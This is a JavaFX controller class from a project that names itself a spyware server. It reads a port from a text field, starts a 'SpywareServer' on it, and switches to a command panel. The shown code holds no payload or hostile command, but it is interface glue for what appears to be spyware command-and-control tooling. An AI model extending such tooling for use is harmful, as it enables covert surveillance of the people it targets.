package com.example.spyware_server_fx;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.TextField;
import javafx.scene.layout.Pane;
import javafx.stage.Stage;

import java.io.IOException;

public class StartServerController {

    @FXML
    public Pane main_panel;

    @FXML
    public TextField server_port;
    HelloController helloController;
    Stage stage;

    public StartServerController(HelloController helloController , Stage stage){
        this.helloController = helloController;
        this.stage = stage;
    }
    @FXML
    void on_start_server_click(ActionEvent event) {
        try {
            helloController.server = new SpywareServer(Integer.valueOf(server_port.getText()), helloController);
            helloController.stage.setScene(helloController.mainScene);

            helloController.switchToCmdPanel();
//            helloController.start_server_btn.setText("Stop Server");
        }
        catch (Exception e){
            try {
                helloController.switchToCmdPanel();
            }
            catch (IOException error){
                System.err.println(e.getMessage());
            }
            helloController.cmd_controller.appendlnOutputCmdText(e.getMessage());
        }
    }
}
